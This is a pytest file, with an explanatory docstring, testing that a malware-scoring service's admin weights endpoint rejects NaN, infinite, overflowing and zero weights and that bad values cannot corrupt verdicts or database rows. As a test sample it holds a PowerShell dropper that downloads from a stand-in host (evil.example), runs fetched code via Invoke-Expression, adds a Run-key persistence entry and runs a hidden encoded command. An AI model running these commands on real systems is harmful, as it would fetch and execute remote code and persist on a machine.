"""A tuning knob must not be able to break the deployment.

`PUT /api/admin/weights` took two floats and normalised them to a ratio. Two
values got through that no ratio can be made from, and each one broke something
that outlives the request:

**NaN.** The engine's validation was `if total <= 0 or rule_weight < 0 or
model_weight < 0`. Every one of those comparisons is False for NaN, so it passed,
normalised to `nan / nan`, and left the process weights non-finite. Starlette
hard-codes `allow_nan=False`, so the response itself 500'd in `text/plain` — the
only non-JSON error this API produces — and afterwards `GET /api/admin/weights`,
`GET /api/capabilities` and `export.signed` all 500'd too. Worse, every later
submission computed a non-finite `final_score`. On SQLite that raised inside the
runner and left jobs at `status=queued, error=NULL` forever. On **Postgres**,
which is what deployments run, `'NaN'::double precision` is a value the column
accepts: the row persists, `GET /api/jobs` fails for every analyst in the
tenant, and neither `weights/reset` nor a restart recovers it, because the
damage is in the database rather than in memory.

**1e308.** `1e308 + 1e308` overflows to `inf`, both weights normalise to `0.0`,
and the endpoint returned **200** for exactly the `{0, 0}` state it rejects with
422 when asked for it directly. Measured: the same dropper went 48.0 / medium /
malicious to 0.0 / low / suspicious, while the same response body still carried
`rule_score` 54.0, `ai_score` 39.1, an impact rating of 7.1 "high" and three
high-severity reasons. Nothing in the report said the scale had been zeroed.

Both are now refused at two levels — the request model and the engine — because
`scoring.set_weights` is reachable from tests, scripts and the tuning UI, and
only one of those goes through pydantic.
"""
from __future__ import annotations

import math

import pytest

from app.engine import scoring
from tests.test_api import _poll_until_done, _submit

#: Enough of a dropper to score well clear of any band edge, so a change in the
#: verdict is a change in the arithmetic and not a rounding accident.
DROPPER = (
    b"$c = New-Object Net.WebClient\n"
    b"$c.DownloadFile('http://evil.example/p.exe', \"$env:TEMP\\p.exe\")\n"
    b"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.example/s')\n"
    b"New-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    b" -Name Upd -Value 'p.exe'\n"
    b"powershell -enc SQBFAFgA -w hidden\n"
)


# --- the engine refuses to hold a state it cannot use ------------------------


@pytest.mark.parametrize(
    "rule, model",
    [
        (float("nan"), 1.0),
        (1.0, float("nan")),
        (float("nan"), float("nan")),
        (float("inf"), 1.0),
        (1.0, float("-inf")),
        (1e308, 1e308),
        (0.0, 0.0),
        (-1.0, 2.0),
        # Python integers are unbounded, so `math.isfinite` does not answer
        # False here — it RAISES OverflowError, an ArithmeticError rather than a
        # ValueError, so it escaped both this function's contract and the 422
        # the API turns a ValueError into.
        (10**400, 1.0),
        (1.0, 10**400),
        (10**400, 10**400),
    ],
)
def test_set_weights_rejects_what_cannot_be_a_ratio(rule, model) -> None:
    before = scoring.get_weights()
    with pytest.raises(ValueError):
        scoring.set_weights(rule, model)
    assert scoring.get_weights() == before, (
        "the weights were mutated before validation failed"
    )


def test_the_weights_are_always_finite_and_sum_to_one() -> None:
    scoring.set_weights(3.0, 1.0)
    w = scoring.get_weights()
    assert math.isfinite(w["rule"]) and math.isfinite(w["model"])
    assert w["rule"] == pytest.approx(0.75) and w["model"] == pytest.approx(0.25)


def test_the_ceiling_is_high_enough_to_be_irrelevant_in_practice() -> None:
    """Refusing a bad value must not refuse a legitimate one. Only the ratio
    matters, so anything up to the bound is a split someone might want."""
    assert scoring.set_weights(scoring.MAX_WEIGHT, 1.0)["rule"] == pytest.approx(1.0)
    assert scoring.set_weights(1.0, 0.0) == {"rule": 1.0, "model": 0.0}


# --- the API answers 422, not 500 --------------------------------------------
#
# Sent as raw bytes, not through the test client's `json=` helper, because that
# helper refuses to encode NaN — and the caller who found this did not use it.
# `NaN` and `Infinity` are what `json.dumps` emits by default and what
# `json.loads` accepts, so they arrive at pydantic as real floats.


def _put(client, auth, body: str):
    return client.put(
        "/api/admin/weights",
        content=body,
        headers={**auth, "Content-Type": "application/json"},
    )


@pytest.mark.parametrize(
    "body",
    [
        '{"rule_weight": NaN, "ai_weight": 1.0}',
        '{"rule_weight": 1.0, "ai_weight": NaN}',
        '{"rule_weight": NaN, "ai_weight": NaN}',
        '{"rule_weight": Infinity, "ai_weight": 1.0}',
        '{"rule_weight": 1.0, "ai_weight": -Infinity}',
        '{"rule_weight": 1e308, "ai_weight": 1e308}',
        '{"rule_weight": -1.0, "ai_weight": 1.0}',
        '{"rule_weight": 0.0, "ai_weight": 0.0}',
    ],
)
def test_the_endpoint_refuses_it(client, auth, body) -> None:
    response = _put(client, auth, body)
    assert response.status_code == 422, f"{body} -> {response.status_code} {response.text[:200]}"
    # Every other error on this API is JSON with a `detail`; the NaN case was
    # the one that came back as text/plain, which no client branch handles.
    assert response.headers["content-type"].startswith("application/json")
    assert "detail" in response.json()


def test_a_refused_change_leaves_the_deployment_working(client, auth) -> None:
    """The state after a rejected tuning attempt has to be the state before it.

    This is the whole finding: the 500 was survivable, and the poisoned process
    behind it was not.
    """
    before = client.get("/api/admin/weights", headers=auth).json()

    _put(client, auth, '{"rule_weight": NaN, "ai_weight": NaN}')

    assert client.get("/api/admin/weights", headers=auth).json() == before
    assert client.get("/api/capabilities").status_code == 200
    assert client.get("/api/jobs", headers=auth).status_code == 200

    public_id = _submit(client, auth, "dropper.ps1", DROPPER)
    detail = _poll_until_done(client, auth, public_id)
    assert detail["status"] == "completed", detail.get("error")
    assert math.isfinite(detail["final_score"])
    assert detail["final_score"] > 0


def test_the_scale_cannot_be_silently_zeroed(client, auth) -> None:
    """1e308 returned 200 and took every verdict to 0.0 while the body it
    returned still carried the evidence for a much higher one."""
    public_id = _submit(client, auth, "dropper.ps1", DROPPER)
    before = _poll_until_done(client, auth, public_id)

    response = client.put(
        "/api/admin/weights", json={"rule_weight": 1e308, "ai_weight": 1e308}, headers=auth
    )
    assert response.status_code == 422, response.text
    assert client.get("/api/admin/weights", headers=auth).json() != {"rule": 0.0, "model": 0.0}

    client.post(f"/api/jobs/{public_id}/reanalyze", headers=auth)
    after = _poll_until_done(client, auth, public_id)
    assert after["final_score"] == pytest.approx(before["final_score"], abs=0.05)
    assert after["verdict"]["verdict"] == before["verdict"]["verdict"]


# --- and nothing non-finite reaches a row ------------------------------------


def test_assess_refuses_to_return_a_non_finite_score(monkeypatch) -> None:
    """The second line of defence, for a corrupt input that is not a weight.

    Postgres accepts `'NaN'::double precision`, so one such row makes the jobs
    list fail for every analyst in that tenant, permanently. Failing the single
    job that produced it — loudly, with the reason on the row — is recoverable;
    writing it is not.
    """
    monkeypatch.setattr(
        scoring, "rule_score", lambda signals, **_kwargs: (float("nan"), [])
    )
    with pytest.raises(ValueError, match="non-finite"):
        scoring.assess([], ioc_total=0)
